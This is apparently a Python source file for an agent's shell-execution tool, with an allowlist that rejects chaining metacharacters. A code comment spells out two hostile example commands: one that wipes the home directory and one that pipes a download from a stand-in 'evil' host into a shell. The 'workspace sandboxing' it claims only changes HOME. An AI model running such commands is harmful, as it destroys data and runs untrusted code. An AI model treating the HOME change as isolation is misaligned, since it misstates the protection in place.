"""Shell command execution tool."""

from __future__ import annotations

import asyncio
import os
import shlex
from typing import Any

from databot.tools.base import BaseTool

# Shell metacharacters that enable command chaining, substitution, or redirection.
# When a command allowlist is active these defeat the allowlist (e.g.
# ``git; rm -rf ~`` or ``git && curl evil | sh``), so they are rejected and the
# command is executed via argv (no shell) instead of through ``/bin/sh``.
_SHELL_METACHARACTERS = frozenset(";|&$`><(){}\n\r")


class ShellTool(BaseTool):
    """Execute shell commands with optional workspace sandboxing."""

    def __init__(
        self,
        working_dir: str = ".",
        timeout: int = 30,
        restrict_to_workspace: bool = True,
        allowed_commands: list[str] | None = None,
        max_output_length: int = 10000,
    ):
        self._working_dir = working_dir
        self._timeout = timeout
        self._restrict_to_workspace = restrict_to_workspace
        self._allowed_commands = allowed_commands or []
        self._max_output_length = max_output_length

    @property
    def name(self) -> str:
        return "shell"

    @property
    def description(self) -> str:
        return (
            "Execute a shell command and return its output. "
            "Use for system operations, kubectl, git, etc."
        )

    def parameters(self) -> dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "command": {
                    "type": "string",
                    "description": "The shell command to execute.",
                },
            },
            "required": ["command"],
        }

    async def execute(self, command: str) -> str:
        if not command or not command.strip():
            return "Error: empty command."

        # When an allowlist is configured, enforce it securely: reject shell
        # metacharacters (which would let an allowlisted command chain into an
        # arbitrary one) and execute via argv rather than through a shell.
        use_shell = True
        argv: list[str] = []
        if self._allowed_commands:
            metachar = next((c for c in command if c in _SHELL_METACHARACTERS), None)
            if metachar is not None:
                return (
                    f"Error: shell metacharacter {metachar!r} is not permitted when a "
                    f"command allowlist is configured. Run a single command without "
                    f"chaining, pipes, redirection, or substitution."
                )
            try:
                argv = shlex.split(command)
            except ValueError as e:
                return f"Error: could not parse command: {e}"
            if not argv:
                return "Error: empty command."
            base_cmd = os.path.basename(argv[0])
            if base_cmd not in self._allowed_commands and argv[0] not in self._allowed_commands:
                return (
                    f"Error: Command '{base_cmd}' is not in the allowed list: "
                    f"{self._allowed_commands}"
                )
            use_shell = False

        try:
            env = os.environ.copy()
            if self._restrict_to_workspace:
                env["HOME"] = self._working_dir

            if use_shell:
                proc = await asyncio.create_subprocess_shell(
                    command,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=self._working_dir,
                    env=env,
                )
            else:
                proc = await asyncio.create_subprocess_exec(
                    *argv,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                    cwd=self._working_dir,
                    env=env,
                )

            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=self._timeout)

            output = ""
            if stdout:
                output += stdout.decode("utf-8", errors="replace")
            if stderr:
                output += "\n[stderr]\n" + stderr.decode("utf-8", errors="replace")

            output += f"\n[exit code: {proc.returncode}]"

            # Truncate very long output
            max_len = self._max_output_length
            if len(output) > max_len:
                output = output[:max_len] + f"\n... (truncated, {len(output)} total chars)"

            return output.strip()

        except asyncio.TimeoutError:
            return f"Error: Command timed out after {self._timeout} seconds"
        except Exception as e:
            return f"Error executing command: {str(e)}"
